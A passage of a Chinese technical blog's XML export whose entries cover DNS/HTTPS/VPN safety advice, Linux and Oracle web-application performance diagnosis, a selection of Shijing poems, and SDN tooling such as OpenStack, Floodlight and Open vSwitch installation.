地址相互通信。为了将域名转换成 IP 地址，计算机会查询解析器软件 —— 通常运行在 Wi-Fi 路由器上或操作系统本身。解析器将查询一个包括 “root” 域名服务器的分布式网络，找出系统在互联网上所谓的“权威”的信息，域名“Linux .com”对应的IP地址。 麻烦的是，上述过程都是基于未经身份验证的通信，很容易假冒，明文协议和响应都可以很容易地被攻击者改变，使查询返回不正确的数据。如果有人设法进行 DNS 查询欺骗并返回错误的IP地址，他们就可以操纵我们系统的 HTTP 请求到指定的地方。 幸运的是，HTTPS 协议有很多内置的保护，可以确保不容易被别人假装成另一个站点。恶意服务器上的 TLS 证书必须匹配您请求的 DNS名称 ，TLS 证书由一个卓有声誉的 数字证书认证中心(Certificate Authority， CA)签发 ，并获得浏览器认可。如果不是这样的话，浏览器会显示出一个很大的警告：你要与之沟通的主机不是他们所说的那个人。如果你看到这样的警告，在选择忽略之前，请格外小心，因为你可能会泄露你的秘密给那些会使用它们的人攻击你。 如果攻击者完全控制了路由器，他们首先可以阻止您的连接使用HTTPS，通过拦截服务器的响应，指示浏览器设置安全连接（这称为“SSL strip 攻击”）。为了帮助保护您免受这种攻击，网站可以增加一个 特殊响应报头，告诉浏览器它们在未来始终使用HTTPS 协议进行通信，但这只是在你的第一次访问之后才有效。对一些非常受欢迎的网站，浏览器现在包括一个硬编码的域名列表，可以设置在第一次访问的时候也使用 HTTPS 协议 。 DNS 欺骗的解决方案称为 DNSSEC （Domain Name System Security Extensions ，CDNS安全扩展，由 IETF 提供的一系列 DNS 安全认证的机制，RFC 2535 ），但它看起来距离被接受的那一天还很遥远，其中有一个重要的障碍 —— 实时感知。DNSSEC 普遍使用之前，我们必须假定，我们收到的 DNS 信息不完全可信的。 4、最后一英里的安全：VPN所以，如果你不能信任 Wi-Fi — 和/或在地下室的无线路由器，它可能比你的大多数宠物的年龄都大，你可以采取什么措施来确保你的设备和互联网通信“最后一英里”的完整性呢？ 一个可接受的解决方案是使用一个信誉良好的 VPN 提供商，在你的系统和基础设施之间建立安全通信链路。我们的希望在于他们比你的路由器厂商和你当前的互联网服务提供商更加关注安全，所以他们可以更好地保证您的流量不受嗅探，或者遏制恶意人士的骚扰。让你所有的工作站和移动设备使用 VPN ，可确保类似 漏洞，例如 KRACK 攻击或不安全的路由器等，不影响你与外部世界通信的完整性。 这里的重要警告是，在选择 VPN 提供商时，必须保证它们的合理地可信性；否则，您只是同另一组恶意行为者进行交易。远离任何提供“免费 VPN”的提供商，他们很可能把你作为间谍目标，或者出售您的流量给营销公司赚钱。 并非所有的设备都需要安装 VPN，但您每天使用的、涉及访问个人私人信息网站的—— 尤其是访问您的金钱和身份信息（政府、银行网站、社交网络等）的任何东西都必须得到安全保护。VPN 不是应对所有网络层漏洞的灵丹妙药，但它肯定会有所帮助，当你在机场使用不安全的 Wi-Fi 卡，或者下次类似 KRACK 漏洞被发现的时候。 扩展阅读：《The Cyber-Security Master》 Cyber-Security: Linux 容器安全的十重境界 Cyber-Security: 警惕 Wi-Fi 漏洞 Cyber-Security: Web应用安全：攻击、防护和检测 Cyber-Security: IPv6 &amp; Security Cyber-Security: OpenSSH 并不安全 Cyber-Security: Linux/XOR.DDoS 木马样本分析 浅谈基于数据分析的网络态势感知 Packet Capturing:关于网络数据包的捕获、过滤和分析 新一代Ntopng网络流量监控—可视化和架构分析 Cyber-Security: 事与愿违的后门程序 | Economist Cyber-Security: 美国网络安全立法策略 Cyber-Security: 香港警务处拟增设网络安全与科技罪案总警司 参考文献 BGP hijacking，BGP 劫持 “Let’s Encrypt” 项目,Let’s Encrypt is a free, automated, and open Certificate Authority. 2015年去过凯悦？请小心你的银行卡 | 2016-01-17 安全威胁情报]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>Policy&amp;Law</tag>
        <tag>DevOps</tag>
        <tag>Cyber-Security</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 性能诊断:荐书《图解性能优化》]]></title>
    <url>%2F2017%2F10%2F24%2FLinux-Perf-Picture%2F</url>
    <content type="text"><![CDATA[摘要 性能分析的基础:吞吐和响应的区别 实际系统中的性能分析 性能调优 性能测试 虚拟化环境下的性能 云环境下的性能 一、性能分析的基础 响应和吞吐的区别（初学者可能经常会混淆的概念）响应：表示应答的快慢吞吐：表示处理数量的多少案例：“明明优化了机器的配置，但性能并没有提高”。响应有问题，却增加了CPU核心数，只是增加了空转的CPU核心而已。所以要养成习惯，先确认问题是出在响应还是吞吐上。 性能分析从测量开始，性能必须是能够测量的性能信息的3种类型：1、概要形式:例如sar、vmstat,作为入手点调查过去发生了什么，“现象”2、事件记录形式:例如网络抓包（Packet Capture）3、快照（Snapshot）：例如ps和top 扩展阅读：《Linux性能分析模型－In 60 Seconds》 性能分析中的重要理论：等待队列理论从性能的稳定性方面来考虑，带宽控制思维方式。 二、实际系统中的性能分析AP服务器的性能测量不同语言的性能信息获取: Java：GC（垃圾回收）日志 ，全GC（Stop the world） DB服务器的性能测量DB服务器本身的特点就是集中管理数据，需要频繁地查看线程（会话）之间的交互，因此很容易出现资源竞争的情况，因此在进行DBMS性能分析的时候，一定要考虑多个线程的存在。 存储性能分析的思路思路：重视IOPS术语：响应时间、IOPS（Input Output Per Second）类型：物理磁盘、SSD 缓存命中率：在存储的世界里，磁盘、存储、OS等各处都存在着缓存，使用缓存命中率作为表示缓存工作效率的指标。脏数据（或者脏数据块）：已经更新但没有写入的数据。脏数据不可以丢弃，如果在缓存上堆积了大量的脏数据，I／O就无法有效运作，进而就会导致问题的发生。 网络性能分析的思路 调查原因 陷阱1:关注受害者，“疑犯”与“真凶” 陷阱2:没有意识到基础不稳 （自下而上） 陷阱3:没有注意到负载的变化 陷阱4:不能确定谁拿着球 陷阱5:不能确定因果关系很多人不能把握原因，而只是随便瞎猜一下就进行调优。掌握因果关系的一个窍门是学习架构知识。知道了机制后就能减少错误分析的情况。另外，从逻辑上来考虑因果关系是很重要的。要试着思考一下“这个现象能否解释另一个现象”。 三、性能调优 调优要循序渐进：先把大石头移开。 具体思路：1、重复使用：连接池、PreparedStatement、线程池2、汇总处理：集中、Piggyback3、提高速度和实现并行4、纵向扩展（Scale Up）与横向扩展（Scale Out）： 应用技巧：1、省略循环2、访问频率高的数据存放入键值存储3、访问频率高的数据存放在使用位置附近4、把同步变成异步5、带宽控制6、LRU算法7、分割处理或者细化锁的力度8、回写缓存、多层缓存9、巨帧和高速网络10、负载均衡 基于LVS的AAA负载均衡架构实践11、写时复制 四、性能测试 项目工程环境基于项目整理来确保应用程序的性能。 应用程序设计负责人一般不会考虑系统整体的性能，而是满脑子考虑如何使用新的框架和中间件来实现需要的业务和功能。 常见的失败情况：9种反面模式 不能在期限内完成 性能很差！解决不了性能问题 由于没有考虑到环境差异而导致发生问题 压力场景设计不完备导致发生问题 没有考虑到缓冲、缓存的时候而导致发生问题 没有考虑到思考时间而导致发生问题 报告内容难以理解导致客户不能认同 客户因为存在不信任感而不能认同 测试很花时间 后期工程中隐藏着性能问题，原因如下： 只有在生产环境中才会出现 问题的显现需要很多条件（环境、数据、负载生成） 因为特定的操作才导致发生性能问题 ==&gt;&gt;为系统中的性能测试流出一个月的时间。 对横跨多个领域的性能问题进行排查的时候，如果不能综合多个领域来考虑，负责人就会一直说“我负责的那部分没有问题”，导致问题无法解决。 客户关心的焦点集中在“在实际生产环境中运行时是否会出现性能方面的问题”。 由于不能很好地共享性能测试地整体过程，或者本来关于性能需求或性能测试设计地需求等地约定就很模糊，导致结论与评价基准等也变得很模糊，引起沟通不畅。 参考案例:Oracle数据库迁移割接实录 需求定义三要素：吞吐（T）、响应时间（R）、用户并发度（U） 1U x R = T 并发并不是作为性能目标通过听取客户意见来推导出来的，而是通常根据吞吐和响应时间计算出一个合适的值（客户即使了解业务中同时使用的人数，但是对于系统瞬间运行的并发处理的情况，他们并不清楚）。 集成测试：多并发运行测试系统测试：压力测试、临界测试、耐久测试运维测试：性能监控测试、故障测试 五、虚拟化环境下的性能在虚拟化环境中，多个VM（虚拟机）运行在一台服务器上，因此可以更加有效地共享资源，有利于削减成本。而反过来，若资源被共享过度，则会发生竞争，可能导致性能的下降。因此，在资源效率和性能之间取得平衡就变得尤为重要。 虚拟化的性能管理（CPU）虚拟环境下Guest OS发出的特权命令会被更改，因此和物理环境相比需要更多的处理时间。另外，物理环境下也不需要将逻辑CPU分配个VM的调度处理，如果CPU的分配发生了竞争，这个等待时间就会影响性能。 六、云计算环境下的性能 构成计算资源的技术元素并没有大的变化 网络访问和资源的使用及提供形态发生了变化 LAN网络的变化 WAN网络的变化 云计算的一个大的变化就是LAN网络。具体来说，本地部署环境下物理路由器和交换机实现的部分被隐藏起来，通过虚拟的网络来组成。 WAN连接方法：1、专线连接：主要依赖于所选择的通信运营商的服务特性，带宽保证和性能的成本与之前相比并没有太大变化。2、互联网连接：云计算服务可以非常优惠的加个来利用共享的互联网带宽，可以减轻高峰时带宽限制的顾虑。云计算服务中提供的CDN（Contents Delivery Network）或Global DNS等功能，能够很方便地提高互联网服务的速度。 随着存储的网络化，直接连接到普通的LAN的情况也越来越多，磁盘I/O变为网络I／O的情况也越来越多。在NAS（Network Attached Storage）以及云环境下，磁盘I/O在普通的TCP／IP网络中完成的情况也很多。（具体第7章） 云计算环境中开发阶段的思维方式在云计算环境下，比起技术方面的差异，思维方式上的差异更为明显。在实际业务层面最大的变化就是对以往的以硬件配置为前提的开发运维流程的影响。 1、基本设计：估算（Sizing）2、系统测试：性能测试3、项目管理 云计算环境中不需要准备硬件，但是并不代表不需要进行估算。观点一：成本估算。成本会根据选定的资源大小而有所变化。观点二：临界估算。在本地部署环境下，企业级系统很多都是集中式的处理方式，如果按照这种方式原封不懂地迁移到云计算环境，可能就会碰到瓶颈，为了消除这种风险，就需要进行估算，考虑临界容量的可实现性。 POC：Proof of Concept (概念验证)云计算的情况下，能在瞬间准备好多种模式的环境用于验证，可通过POC来验证运行情况、搭建模式与费用。 在云计算环境下，容量管理与成本管理是一体的。 云计算服务的核心是根据负载使用量收费。由于这种收费模式，原来只有工程师会关注的传送量、I／O数、HTTP请求数等详细的性能指标数据会直接反映在费用上，因此需要经营者掌握这些性能指标及其含义。使用云计算后，容量与成本就联系到一起，因此云计算可能是促使经营者学习容量分析的一个有效手段。 运维：除了应对峰值，在没有业务流量的时间段内动态削减多余的资源，降低成本，也是很有价值的。 扩展阅读：电子书《Linux Perf Master》 https://riboseyim.gitbook.io/perf https://www.gitbook.com/book/riboseyim/linux-perf-master/details 扩展阅读 Linux 性能诊断:负载评估 Linux 性能诊断:快速检查单 操作系统原理 | How Linux Works（一）：启动 操作系统原理 | How Linux Works（二）：空间管理 操作系统原理 | How Linux Works（三）：内存管理 操作系统原理 | How Linux Works（三）：网络管理 扩展阅读：动态追踪技术 动态追踪技术(一)：DTrace 导论 动态追踪技术(二)：strace+gdb 溯源 Nginx 内存溢出异常 动态追踪技术(三)：Tracing Your Kernel Function! 动态追踪技术(四)：基于 Linux bcc/BPF 实现 Go 程序动态追踪 动态追踪技术(五)：Welcome DTrace for Linux]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>Linux</tag>
        <tag>SRE</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 性能诊断:Web 应用性能优化]]></title>
    <url>%2F2017%2F10%2F24%2FLinux-Perf-Wan%2F</url>
    <content type="text"><![CDATA[摘要 一、常见性能优化要求 二、优化分析过程 三、性能分析工具箱 四、系统基础问题检查 万老师多年前的一篇内部分享，发布出来供有需要的同学参考。虽然今天的应用系统的复杂度跟过去会有所不同，性能观测工具、数据规模也不可以同日而语，但是正所谓一切历史都是当代史（“Ogni storia e la storia contemporanea”），厘清过去的问题是为了更好地理解现在和未来。为了保持原貌，编辑过程中基本遵循原文，之后也不再更新。 一、常见性能优化要求在我经历的性能优化案例中，常见的问题都是这样开始的： a) 前台访问很慢，请帮忙分析优化 b) 用户对性能很不满意，再不解决就要投诉 c) 数据库负载很重，请帮忙分析一下 d) XXX功能打开需要1分钟，请帮忙分析一下。而等我访问这个功能的时候，可能几秒钟就返回；等你满怀困惑的找到问题提出人员，如果足够幸运的话，可能他告诉你要选择什么查询条件，问题能够重现；当然另一个可能是他也是转述用户的话。 在接到这些性能优化要求的时候，我都希望能够了解下面的信息以判断问题的类型，而通常情况下，我的工作都是在这些信息并不存在的情况下开始的 a)系统性的问题? 比如CPU利用率，SWAP利用率或者IO过高导致的整体性能下降？ b)功能性问题？ 整体性能良好，个别功能时延很长 c)新出现问题？什么时候开始的，之前系统有哪些变动？（升级或者管理的资源大量增加） d)不规律问题？有时候快，有时候慢，没有特定规律 还有性能快慢的衡量标准是什么？原来多少秒，现在多少秒，目标是多少秒？ 只有上述问题得到了准确的回答，优化工作才能开始。 而获取上述答案的方法就是测量，有可靠的监控工具对用户的访问时延，系统的CPU,IO,SWAP进行准确的测量，当系统发生性能瓶颈时，系统当时的状态，数据库当时的状态进行及时的记录，依赖这些数据才能开始优化。 案例1，天津客户曾经有过投诉，系统经常性的出现整体性能下降，几乎无法访问的情况，而且发生的时间没有任何规律。 我部署了监控工具，3周后分析数据，发现访问性能下降之前用户都执行了某一个历史告警查询，而在此之后的数据库性能曲线也急剧下降。研发人员对此功能优化后，问题再也没有出现。 案例2，南京客户某主机经常崩溃，根据监控工具在崩溃前记录的进程列表看，是某个程序挂起导致的进程越积越多，资源耗尽而崩溃，对该程序改进后，故障再未发生。 之所以费这么多笔墨，就是希望能够让各位明白，没有定量的测量，性能优化工作完全是空中楼阁，无法进行。而通过工具的部署和监测，今后我们提出的性能问题可能就是这样： a) 系统整体负载正常，但/nms/res/devicelist_down.jsp目前经常出现35046毫秒的访问时延，请协助排查一下 b) 系统SWAP利用率经常会超过50%，这时候系统响应很慢，杀掉GetCGFlux.pl后恢复正常，请分析一下 c) 或者数据库服务器目前CPU利用率居高不下，已经持续了一段时间，请分析一下 如果性能优化工作以这样的方式开始的话，这项工作就会变得轻松有趣得多了。 二、优化分析过程 性能数据收集 这一步是性能优化的基础，如果问题系统之前没有部署监控工具的话，那么就要部署监控工具，收集一段时间的数据后才能开始分析；当然也有例外，幸运的话，性能问题正在发生并且如此显著，比如某个程序长时间无法挂起，或者某个进程把整台主机的CPU都吃掉，或者某个功能查询很慢,次次如此。当然这种问题也就很少需要到我这，你就可以直接找开发人员解决了。 很多情况，问题可能不是那么明显，也不是那么规律，可能也涉及到系统的多项功能，这个时候，我们就必须要借助于工具来进行数据的收集。 性能数据分析 如果没有数据收集，分析工作可能很神秘，完全依赖于专家的个人经验。以前听过一个故事，一个工厂的打印机总是莫名其妙的在某个时间出现故障，后来请了一个专家，搬了把椅子坐在打印机附近，几个星期后，叫工人把地板的某个角修好，之后这个问题再也没有出现。 但是有了之前收集的数据，观察CPU，IO，应用时延，网络性能等不同指标的曲线，观察问题出现的时间点，存在问题的功能，任何一个IT业者，都应该具备从这些数据中发现问题的能力。例如某台采集机SYSLOG处理经常出现会滞后的情况。而这台机器的网络丢包是这个样子的，那么问题是不是显而易见？ 再比如有一个巡检功能，数据某个时段总是大量入库失败，那你看到数据库CPU和连接数在这个时段是这样的，数据库连接数增加，CPU空闲率为0，那么是不是问题也很明显了。 实施优化工作 这一步主要是针对之前发现的问题，采取措施。可能是系统维护人员调整采集负载，让负荷更均匀；或者调整主机或数据库参数；当然更多的可能是程序需要优化 评估优化效果 譬如上述第二个例子，采取优化措施后，无论是网络连接数还是数据库主机负载，都已经很平稳，而问题也不再出现。 如果没有达到，则不断重复上述四步，继续优化。 三、性能分析工具箱这个工具箱是我常用的性能分析工具，曾协助我解决了很多的性能优化难题 a) web访问时延监控工具AssayFilter 部署在主应用上 部署后可以在resin/logs/AssayFilter.log里面看到访问时间，访问的用户，访问的URL，时延毫秒，来源IP，据此我们就可以将用户的感知定量化，数据化 1220150227094607 zengguojin /nms/res/devicelist_down.jsp 309356 219.159.77.116 ms20150209113913 zengguojin /nms/res/devicelist_down.jsp 383042 219.159.77.116 ms 从这两条数据里我们可以知道这个用户在访问这个功能时候遭遇过多次等待300多秒的情况,他又会有怎样的满意度呢？ 针对这个工具可能有人怀疑是否准确，是否统计时延过高是网络延迟导致。这里解释一下他的工作机制，如下图： AssayFilter作为一个拦截器，统计的是访问请求进入resin之后和应答离开resin之前的时长，访问时延=resin处理时长+主应用到数据库网络时延+oracle的SQL执行时长 主应用到数据库都在一个交换机上，所以主应用到数据库网络时延可以忽略不计。 所以，这个工具完全避免了网络延迟对访问时延统计的影响，让我们的精力完全聚焦在WEB应用自身的性能上. b) 主机监控探针wd_probe 部署在主机上 这个监控探针除了能起到主机告警通知的作用，也是一个我依赖的性能分析工具，他能够记录各个时间点的CPU,SWAP,磁盘IO,网络性能，进程数量，网络连接数量的性能数据，当CPU超过预设阀值时会输出系统当时的进程快照用于事后的分析。 在探针主目录的data/perf下有性能数据，在data/tmp下有系统进程快照 c) 数据库超长SQL收集工具 部署在主应用上，可以在cron里每分钟执行一次 这个程序会不断捕捉执行时间超过6秒的sql,记录进 /tmp/sql.csv文件中，运行结果如下： 从发起端看可分为两类，通常从APP发起的JDBC程序就是用户前台访问执行的SQL,而这种SQL执行时间超过6秒就是我们需要优化的SQL. 四、系统基础问题检查 主机基础故障问题 磁盘空间是否空闲为0？ SWAP利用率是否超过40%? CPU利用率是否长时间超过85%？ 网络是否持续丢包？ 工作磁盘IO的利用率是否持续100%?上述状况通常意味着系统有较严重问题，需要进一步从程序或者数据库上查找原因。 resin的JVM检查Web应用的前台程序jsp和class都是运行在resin的JVM里，JVM(Java虚拟机)类似于oracle数据库，jsp和class类似于SQL,都可以看作一个系统软件，那么仅仅是看java进程在不在，前台能不能访问是不够的。就像没有sqlplus,PLSQL我们就无法维护数据库，同样的JVM也有相应的维护工具,，都在JAVA_HOME/bin下 a. 查看JVM的内存占用情况 1jstat -gcutil &lt;pid&gt; 3s 5 这条命令间隔3秒钟查看JVM的内存利用率，取样5次， S0 S1 E O P YGC YGCT FGC FGCT GCT 0.00 98.51 44.95 39.41 63.43 9 0.070 2 0.195 0.266 永久内存区利用率63.43%, Elden和old区分别是44.95%和39.41% b. 查看JVM的堆栈调用情况1jstack &lt;pid&gt; 这条命令把当前JVM里所有的线程调用堆栈输出。在前台访问无响应的时候，排查故障根源时特别有用。 上述Thread-831被38f06e88的线程所阻塞，而根据调用堆栈，可以准确的定位到执行程序，进行排查。 c. 查看错误日志是否有内存溢出错误日志在resin/logs/error.log或者resin/log/jvm-default.log如果有java.lang.OutOfMemoryError: PermGen space 说明JVM的永久内存区不足 -XX:MaxPermSize=256m 可根据永久内存区利用率调整到256M java.lang.OutOfMemoryError说明JVM的堆内存不足 -Xmx2048m -Xms2048m 把堆内存调大到2048G 如果把Xmx加到2G，仍然会出现上述错误，那可能是有内存泄漏，需要开发人员排查 数据库检查oracle排查比较复杂，我只能从两方面简单举几个例子。 a) 系统参数层面优化 1) sga是否充分利用了系统内存，sga可以配系统内存的一半. 而我遇到过主机64G内存，sga_target设置为5G 2) db_cache_size最好在sga_target-3G，因为我们的程序很多没有使用绑定变量,如果不设置db_cache_size,则渐渐的SGA都有被share_pool占用的趋势，数据被缓存的越来越少，获取数据需要从磁盘读取，这样整体性能肯定会下降。 3) shared_servers设置为0，让数据库运行在专有模式而不是共享服务器模式 虽然系统参数调整会在整体上带来一定的性能改善，但相比于糟糕的SQL或者程序设计以及失效的索引和过期的统计数据对性能起到的作用，还是很有限的。 b) 应用优化层面 1) 定位问题SQL 这个SQL能够列出数据库当前正在执行的所有SQL, 123select distinct s.sid,s.serial#,s.blocking_session,p.spid PID,to_char(s.logon_time,'YYYY-MM-DD HH24:MI:SS') logontime ,substr(s.machine,1,15) smachine,substr(s.program,1,20) sprogram,q.sql_id,substr(q.sql_text,1,200) sql from v$sql q,v$session s,v$process pwhere q.hash_value=s.sql_hash_value and q.address=s.sql_address and p.addr=s.paddr 基于两个判断标准我们能很快的找到问题SQL 第一种是某个进程执行的SQL占用的CPU非常高，CPU利用率从Top命令获得，进程ID即PID 第二种是某类进程执行的SQL非常多，单个CPU不高，但合并起来就非常高了。 针对SQL就可以找支撑人员进一步判断是否需要找开发人员优化。 2) 是否存在session被其他session阻塞的情况 查看上一SQL结果的blocking_session字段，如果被阻塞的进程都被某一会话锁定，需要把该session杀掉 alter system kill session ‘sid,serail#’; 遇到过几次系统非常慢的情况，经查看都是开发或者维护用plsql把某表锁住，导致相关会话都被阻塞 3) 对该SQL所涉及的表进行表分析，更新其统计信息 性能优化非常精深，很多东西我也在学习，先把经常出现的一些问题解决经验总结出来，供大家分享。 扩展阅读：电子书《Linux Perf Master》 https://riboseyim.gitbook.io/perf https://www.gitbook.com/book/riboseyim/linux-perf-master/details 扩展阅读 Linux 性能诊断:负载评估 Linux 性能诊断:快速检查单 操作系统原理 | How Linux Works（一）：启动 操作系统原理 | How Linux Works（二）：空间管理 操作系统原理 | How Linux Works（三）：内存管理 操作系统原理 | How Linux Works（四）：网络管理 扩展阅读：动态追踪技术 动态追踪技术(一)：DTrace 导论 动态追踪技术(二)：strace+gdb 溯源 Nginx 内存溢出异常 动态追踪技术(三)：Tracing Your Kernel Function! 动态追踪技术(四)：基于 Linux bcc/BPF 实现 Go 程序动态追踪 动态追踪技术(五)：Welcome DTrace for Linux 参考文献]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>Linux</tag>
        <tag>SRE</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[风月集 | 诗三百 思无邪]]></title>
    <url>%2F2017%2F10%2F18%2FArtistic-Poetry%2F</url>
    <content type="text"><![CDATA[摘要 《诗经》精选 《诗经》的版本问题 《孔丛子·巡狩篇》：“古者天子命史采歌谣，以观民风。” 关于《诗经》中诗的分类，有“四始”之说，即《风》、《大雅》、《小雅》、《颂》的四篇列首位的诗。《国风》按地区划分，包括“周南”、“召南”、“邶风”、“鄘风”、“卫风”、“王风”、“郑风”、“桧风”、“齐风”、“魏风”、“唐风”、“秦风”、“豳风”、“陈风”和“曹风”，共160篇。 《诗经》的版本问题 《小雅》为宴请宾客之乐。《大雅》则是君臣庙堂的典礼之乐，多数是公卿大夫的作品。《颂》是贵族在家庙中敬祖先鬼神，歌颂文治武功的祭祀之乐。《诗经》中的精华部分是《国风》，后人将其与屈原的《离骚》并称为“风骚”。 周南·关雎 关关雎鸠，在河之洲。窈窕淑女，君子好逑。参差荇菜，左右流之。窈窕淑女，寤寐求之。求之不得，寤寐思服。悠哉悠哉，辗转反侧。参差荇菜，左右采之。窈窕淑女，寤寐求之。参差荇菜，左右流之。窈窕淑女，琴瑟友之。参差荇菜，左右芼之。窈窕淑女，鼓瑟乐之。 王风·黍离 彼黍离离，彼稷之苗。行迈靡靡，中心摇摇。知我者，谓我心忧；不止我者，谓我何求。悠悠苍天，此何人哉！彼黍离离，彼稷之穗。行迈靡靡，中心如醉。知我者，谓我心忧；不止我者，谓我何求。悠悠苍天，此何人哉！彼黍离离，彼稷之实。行迈靡靡，中心如噎。知我者，谓我心忧；不止我者，谓我何求。悠悠苍天，此何人哉！ 王风·采葛 彼采葛兮，一日不见，如三月兮。彼采萧兮，一日不见，如三秋兮。彼采艾兮，一日不见，如三岁兮。 齐风·甫田 无田甫田，维莠骄骄。无思远人，劳心忉忉。无田甫田，维莠桀桀。无思远人，劳心怛怛。婉兮娈兮，总角兮，未几见兮，突而弁兮。 魏风·硕鼠 硕鼠硕鼠，无食我黍。三岁贯女，莫我肯顾。逝将去女，适彼乐土。乐土乐土，得我所。硕鼠硕鼠，无食我麦。三岁贯女，莫我肯德。逝将去女，适彼乐国。乐国乐国，爰得我直。硕鼠硕鼠，无食我苗。三岁贯女，莫我肯劳。逝将去女，适彼乐郊。乐郊乐郊，谁之永号。 陈风·月出 月出皎兮，佼人僚兮，舒窈纠兮，劳心悄兮。月出皓兮，佼人兮，舒受兮，劳心兮。月出照兮，佼人僚兮，舒夭绍兮，劳心惨兮。 子曰：“诗三百，一言以蔽之，思无邪”。 小雅·鹿鸣之什 呦呦鹿鸣，食野之苹。我有嘉宾，鼓瑟吹笙。吹笙鼓簧，承筐是将。人之好我，示我周行。呦呦鹿鸣，食野之蒿。我有嘉宾，德音孔昭。视民不恌，君子是则是效。我有旨酒，嘉宾式燕以敖。呦呦鹿鸣，食野之芩。我有嘉宾，鼓瑟鼓琴。鼓瑟鼓琴，和乐且湛。我有旨酒，以燕乐嘉宾之心。 大雅·生民之什·假乐 假乐君子，显显令德。宜民宜人，受禄于天。保右命之，自天申之。 商颂 天命玄鸟，降而生商，宅殷土芒芒。古帝命汤武，正域彼四方。方命厥后，奄有九有。商之先后，受命不殆，在武丁孙子。武丁孙子，武王靡不胜。龙十乘，大是承，邦千里，维民所止，肇域彼四海。四海来假，来假祁祁。景员维河，殷受命咸宜，百禄是何。 扩展阅读 古典音乐低俗史 舞台剧：南海十三郎 电影评论|灵魂解码《林肯》 电影评论|斯皮尔伯格的林肯情怀 风月集|诗三百，思无邪 世纪小说《悲惨世界》 红楼故事：佩刀沽酒作长歌 红楼故事：康熙的秘密情报系统 江南园林鉴赏|南京瞻园 摄影专辑|珠海航空航天展览 参考文献 陆氏草木鸟獣虫鱼疏図解 （影印）| 日本国会图书馆 南北朝乐府民歌]]></content>
      <categories>
        <category>生活艺术</category>
      </categories>
      <tags>
        <tag>Artistic</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SDN 技术指南（六）：OpenStack or Kubernetes ?]]></title>
    <url>%2F2017%2F10%2F16%2FSDN-Cloud%2F</url>
    <content type="text"><![CDATA[摘要待编辑 SDN 与 OpenStackOpenStack 核心组件 组件 OpenStack实现 AWS实现 备注 计算组件（Compute） Nova EC2 提供按需交付的虚拟机资源 镜像组件（Image） Glance 对象存储组件（Object Storage） Swift S3 无需额外进行文件路径的挂载操作 块存储组件（Block Storage） Cinder EBS 曾用名 Nova-volumem 网络服务组件（Network） Quantum VPC 满足其它组件所需的网络链接要求 仪表盘组件（Dashboard） Horizon Console 管理操作界面 身份识别组件（Identity） Keystone IAM 指定服务目录 SDN 与 KubernetesDiscuss Is Kubernetes Repeating OpenStack’s Mistakes? | Boris Renski on September 7, 2017 AWS or Azure : 云计算平台的趋势分析|Stack Overflow,2017 扩展阅读SDN技术专题 SDN 技术指南（一）: 架构概览 SDN 技术指南（二）：OpenFlow SDN 技术指南（三）：SDN Controller SDN 技术指南（四）：Open vSwitch SDN 技术指南（五）：NFV SDN 技术指南（六）：OpenStack or Kubernetes ? SDN 技术指南（七）：标准化组织 SDN 技术指南（八）：案例教学 SDN技术指南（十）：在线课程推荐 网络编程专题 浅谈基于数据分析的网络态势感知 网络数据包的捕获与分析（libpcap、BPF及gopacket） 新一代Ntopng网络流量监控—可视化和架构分析 网络安全专题 Cyber-Security: IPv6 &amp; Security Cyber-Security|香港拟增设网络安全与科技罪案总警司 云计算专题 AWS or Azure : 云计算平台的趋势分析|Stack Overflow,2017 参考文献 容器化OpenStack对未来架构的影响 | 陈沙克 2016年 OpenStack 总结 | 陈沙克 OpenStack落地的五大难点 | 肖力@云技术实践]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>网络协议</tag>
        <tag>SDN</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SDN 技术指南（三）：OpenDaylight or Floodlight]]></title>
    <url>%2F2017%2F10%2F16%2FSDN-Controller%2F</url>
    <content type="text"><![CDATA[摘要 OpenDaylight or Floodlight FloodlightInstall &amp; Run12345$ git clone git://github.com/floodlight/floodlight.git$ cd floodlight/$ ant$ java -jar target/floodlight.jar// 默认监听端口 6633 配置 Open vSwitch 连接Floodlight 一个 OVS 可以同时配置一个或者多个控制器 1$ ovs-vsctl set-controller ovs-switch tcp:9.181.137.182:6633 OPNFVebook | Understanding OPNFV Network Functions Virtualization: All Roads Lead to OPNFV 扩展阅读SDN技术专题 SDN 技术指南（一）: 架构概览 SDN 技术指南（二）：OpenFlow SDN 技术指南（三）：SDN Controller SDN 技术指南（四）：Open vSwitch SDN 技术指南（五）：NFV SDN 技术指南（六）：OpenStack or Kubernetes ? SDN 技术指南（七）：标准化组织 SDN 技术指南（八）：案例教学 SDN技术指南（十）：在线课程推荐 网络编程专题 浅谈基于数据分析的网络态势感知 网络数据包的捕获与分析（libpcap、BPF及gopacket） 新一代Ntopng网络流量监控—可视化和架构分析 网络安全专题 Cyber-Security: IPv6 &amp; Security Cyber-Security|香港拟增设网络安全与科技罪案总警司 云计算专题 AWS or Azure : 云计算平台的趋势分析|Stack Overflow,2017 参考文献]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>网络协议</tag>
        <tag>SDN</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SDN 技术指南（四）：Open vSwitch]]></title>
    <url>%2F2017%2F10%2F13%2FSDN-OpenvSwitch%2F</url>
    <content type="text"><![CDATA[摘要 Open vSwitch 安装 Open vSwitch 命令行 Open vSwitch 运行原理 Open vSwitch 性能监控 前言由之前发布的文章知道 Open vSwitch(Open Source Virtual Switch) 是一款基于软件实现的开源虚拟交换机。 SDN 技术指南（一）: 架构概览 SDN 技术指南（二）: OpenFlow Open Source Virtual Switch:Community-Based, Open Source,. Full-Featured Network Operating System. 一、Open vSwitch 安装12345678910111213# 第一步：Getting the Codegit clone https://git.openswitch.net/openswitch/ops-build# 第一步：选择编译模式# 模式一：To a supported white box switch ( 例如 VMware vSwitch、vDS、Nexus 1000V)make configure genericx86-64# 模式二：OVA （可以直接导入虚拟机，例如 Oracle Virtual box ）make configure appliance# 第三步：打包make 二、Open vSwitch 